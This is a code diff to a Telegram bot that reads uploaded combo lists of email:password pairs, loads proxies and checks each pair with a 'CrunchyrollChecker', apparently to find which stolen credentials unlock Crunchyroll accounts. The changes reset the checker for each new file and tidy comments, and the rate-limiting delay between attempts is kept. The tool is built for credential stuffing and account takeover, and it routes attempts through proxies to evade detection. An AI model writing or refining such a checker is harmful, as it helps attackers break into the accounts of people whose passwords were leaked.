@@ -228,7 +228,7 @@ async def handle(message: types.Message):
         checker.proxies = proxies
         return await message.answer(f"✅ Loaded {len(proxies)} proxies!")
 
-    # Combo checking
+    # Combo checking - NEW FILE → reset checker so second txt works
     if message.document:
         file = await bot.get_file(message.document.file_id)
         content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
@@ -241,7 +241,6 @@ async def handle(message: types.Message):
         raw = raw.strip()
         if not raw or ':' not in raw:
             continue
-        # Take only email:password part, ignore everything after
         if '@' in raw:
             part = raw.split(':', 1)
             if len(part) == 2 and '@' in part[0]:
@@ -251,6 +250,9 @@ async def handle(message: types.Message):
 
     if not lines:
         return await message.answer("No valid email:password found.")
+
+    # ←←← THIS IS THE ONLY LINE I ADDED
+    checker = CrunchyrollChecker(proxies)
 
     await message.answer(f"🚀 Checking {len(lines)} combos...")
 
@@ -269,7 +271,7 @@ async def handle(message: types.Message):
 
             await send_result(message.from_user.id, result)
 
-            await asyncio.sleep(1.5)   # Safe delay
+            await asyncio.sleep(1.5)
 
         except:
             continue
